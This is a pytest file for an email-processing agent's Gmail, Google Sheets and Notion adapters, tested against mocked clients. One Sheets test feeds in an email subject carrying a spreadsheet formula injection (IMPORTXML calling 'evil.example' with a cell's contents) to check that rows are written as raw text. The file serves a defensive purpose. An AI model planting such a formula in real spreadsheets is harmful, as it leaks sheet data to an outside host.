"""Adapters: the exact payloads sent to Gmail, Sheets and Notion, against mocked clients."""

import base64
import email
from email import policy
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest

from gmail_operations_agent.domain import Priority
from gmail_operations_agent.errors import BlockedError, PermanentError
from gmail_operations_agent.integrations.gmail import (
    GmailDraftSink,
    GmailSource,
    build_reply,
    label_query,
    reply_subject,
)
from gmail_operations_agent.integrations.google_api import GoogleApi
from gmail_operations_agent.integrations.notion import TEXT_LIMIT, NotionSink, chunk_text
from gmail_operations_agent.integrations.sheets import HEADER, SheetsSink
from tests.fakes import make_email, make_triage


class MockGoogleApi(GoogleApi):
    def __init__(self) -> None:
        self.gmail_service = MagicMock()
        self.sheets_service = MagicMock()

    def gmail(self) -> Any:
        return self.gmail_service

    def sheets(self) -> Any:
        return self.sheets_service


# --- Sheets --------------------------------------------------------------------------


async def test_sheets_append_uses_raw_input_so_formulas_stay_text() -> None:
    api = MockGoogleApi()
    values = api.sheets_service.spreadsheets.return_value.values.return_value
    values.get.return_value.execute.return_value = {"values": [HEADER]}
    values.append.return_value.execute.return_value = {"updates": {"updatedRange": "Inbox!A2:J2"}}
    sink = SheetsSink(api, "sheet-id", "Inbox")
    hostile = make_email(subject='=IMPORTXML("https://evil.example/?"&A1, "//a")')

    result = await sink.execute(hostile, make_triage())

    kwargs = values.append.call_args.kwargs
    assert kwargs["valueInputOption"] == "RAW"
    row = kwargs["body"]["values"][0]
    assert row[3] == hostile.subject  # passed through as a plain string
    assert row[-1] == hostile.id  # message id column used for duplicate checks
    assert len(row) == len(HEADER)
    assert result.external_id == "Inbox!A2:J2"


async def test_sheets_writes_header_into_an_empty_sheet() -> None:
    api = MockGoogleApi()
    values = api.sheets_service.spreadsheets.return_value.values.return_value
    values.get.return_value.execute.return_value = {}
    values.append.return_value.execute.return_value = {}
    await SheetsSink(api, "sheet-id", "Inbox").execute(make_email(), make_triage())
    assert values.update.call_args.kwargs["body"] == {"values": [HEADER]}


async def test_sheets_find_existing_looks_up_the_message_id_column() -> None:
    api = MockGoogleApi()
    values = api.sheets_service.spreadsheets.return_value.values.return_value
    values.get.return_value.execute.return_value = {"values": [["Message ID"], ["x"], ["m1"]]}
    found = await SheetsSink(api, "sheet-id", "Inbox").find_existing(make_email("m1"))
    assert found is not None
    assert found.external_id == "Inbox!A3:J3"
    assert values.get.call_args.kwargs["range"] == "Inbox!J:J"


# --- Gmail ---------------------------------------------------------------------------


def test_reply_subject_strips_any_number_of_prefixes() -> None:
    assert reply_subject("RE: Re: Fwd? no") == "Re: Fwd? no"
    assert reply_subject("Ответ: Сроки") == "Re: Сроки"
    assert reply_subject("") == "Re: (no subject)"


def test_reply_threads_correctly_and_prefers_reply_to() -> None:
    original = make_email(
        reply_to="assistant@acme.io", references="<a@x> <b@x>", message_id_header="<c@x>"
    )
    message = build_reply(original, "Thanks!")
    assert message["To"] == "assistant@acme.io"
    assert message["In-Reply-To"] == "<c@x>"
    assert message["References"] == "<a@x> <b@x> <c@x>"


async def test_draft_is_created_in_the_original_thread() -> None:
    api = MockGoogleApi()
    drafts = api.gmail_service.users.return_value.drafts.return_value
    drafts.create.return_value.execute.return_value = {"id": "d1"}
    result = await GmailDraftSink(api).execute(make_email("m1"), make_triage())

    body = drafts.create.call_args.kwargs["body"]["message"]
    assert body["threadId"] == "t-m1"
    sent = email.message_from_bytes(base64.urlsafe_b64decode(body["raw"]), policy=policy.default)
    assert sent["Subject"] == "Re: Quote for a RAG chatbot"
    assert "send the quote" in sent.get_content()
    assert result.external_id == "d1"


async def test_draft_find_existing_matches_in_reply_to() -> None:
    api = MockGoogleApi()
    threads = api.gmail_service.users.return_value.threads.return_value
    threads.get.return_value.execute.return_value = {
        "messages": [
            {"id": "orig", "labelIds": ["INBOX"]},
            {
                "id": "draft-msg",
                "labelIds": ["DRAFT"],
                "payload": {"headers": [{"name": "In-Reply-To", "value": "<m1@example.com>"}]},
            },
        ]
    }
    found = await GmailDraftSink(api).find_existing(make_email("m1"))
    assert found is not None
    assert found.external_id == "draft-msg"


def test_label_query_matches_gmail_search_syntax() -> None:
    assert label_query("Agent/Processed") == "agent-processed"
    assert label_query("My Label") == "my-label"


async def test_poll_creates_nested_label_and_skips_known_messages_oldest_first() -> None:
    api = MockGoogleApi()
    users = api.gmail_service.users.return_value
    users.labels.return_value.list.return_value.execute.return_value = {"labels": []}
    users.labels.return_value.create.return_value.execute.side_effect = [
        {"id": "L1"},
        {"id": "L2"},
    ]
    users.messages.return_value.list.return_value.execute.return_value = {
        "messages": [{"id": "new2"}, {"id": "known"}, {"id": "new1"}]
    }
    raw = base64.urlsafe_b64encode(b"Subject: hi\r\n\r\nbody").decode()
    users.messages.return_value.get.return_value.execute.return_value = {
        "threadId": "t",
        "raw": raw,
    }
    source = GmailSource(api, "Agent/Processed", lookback_days=3)

    messages = await source.poll(lambda mid: mid == "known")

    created = [c.kwargs["body"]["name"] for c in users.labels.return_value.create.call_args_list]
    assert created == ["Agent", "Agent/Processed"]
    query = users.messages.return_value.list.call_args.kwargs["q"]
    assert query == "in:inbox -label:agent-processed newer_than:3d"
    assert [m.id for m in messages] == ["new1", "new2"]


@pytest.mark.parametrize(("mark_as_read", "removed"), [(False, None), (True, ["UNREAD"])])
async def test_mark_processed_adds_label_and_keeps_unread_by_default(
    mark_as_read: bool, removed: list[str] | None
) -> None:
    api = MockGoogleApi()
    source = GmailSource(api, "Agent/Processed", mark_as_read=mark_as_read)
    source._label_id = "L2"
    await source.mark_processed(make_email("m1"))
    body = api.gmail_service.users.return_value.messages.return_value.modify.call_args.kwargs[
        "body"
    ]
    assert body["addLabelIds"] == ["L2"]
    assert body.get("removeLabelIds") == removed


# --- Notion --------------------------------------------------------------------------


def test_chunk_text_respects_the_limit_and_keeps_all_text() -> None:
    text = ("word " * 900) + "x" * 2500
    chunks = chunk_text(text)
    assert all(len(chunk) <= TEXT_LIMIT for chunk in chunks)
    assert "".join(chunks).replace(" ", "") == text.replace(" ", "")


def notion_client(properties: dict[str, Any]) -> Any:
    return SimpleNamespace(
        databases=SimpleNamespace(
            retrieve=AsyncMock(return_value={"data_sources": [{"id": "ds1", "name": "Tasks"}]})
        ),
        data_sources=SimpleNamespace(
            retrieve=AsyncMock(return_value={"properties": properties}),
            query=AsyncMock(return_value={"results": []}),
        ),
        pages=SimpleNamespace(create=AsyncMock(return_value={"id": "p1", "url": "https://n/p1"})),
    )


async def test_notion_page_payload_and_long_description() -> None:
    client = notion_client(
        {
            "Task": {"type": "title"},  # not called "Name": detected automatically
            "Priority": {"type": "select"},
            "Gmail ID": {"type": "rich_text"},
        }
    )
    sink = NotionSink("token", database_id="db", client=client)
    triage = make_triage(priority=Priority.URGENT)
    triage.task.description = "long " * 1000  # type: ignore[union-attr]

    result = await sink.execute(make_email("m1"), triage)

    kwargs = client.pages.create.call_args.kwargs
    assert kwargs["parent"] == {"type": "data_source_id", "data_source_id": "ds1"}
    props = kwargs["properties"]
    assert props["Task"]["title"][0]["text"]["content"] == "Send a quote to Anna"
    assert props["Priority"] == {"select": {"name": "Urgent"}}
    assert props["Gmail ID"]["rich_text"][0]["text"]["content"] == "m1"
    texts = [
        item["text"]["content"]
        for block in kwargs["children"]
        for item in block.get(block["type"], {}).get("rich_text", [])
    ]
    assert all(len(text) <= TEXT_LIMIT for text in texts)
    assert result.url == "https://n/p1"


async def test_notion_without_id_property_disables_lookup_but_still_works() -> None:
    client = notion_client({"Name": {"type": "title"}})
    sink = NotionSink("token", database_id="db", client=client)
    assert await sink.find_existing(make_email()) is None
    client.data_sources.query.assert_not_called()
    await sink.execute(make_email(), make_triage())
    assert "Priority" not in client.pages.create.call_args.kwargs["properties"]


async def test_notion_database_with_several_sources_needs_explicit_id() -> None:
    client = notion_client({})
    client.databases.retrieve.return_value = {"data_sources": [{"id": "a"}, {"id": "b"}]}
    with pytest.raises(BlockedError, match="NOTION_DATA_SOURCE_ID"):
        await NotionSink("token", database_id="db", client=client).schema()


async def test_notion_task_is_required() -> None:
    client = notion_client({"Name": {"type": "title"}})
    with pytest.raises(PermanentError):
        await NotionSink("token", database_id="db", client=client).execute(
            make_email(), make_triage(task=None)
        )
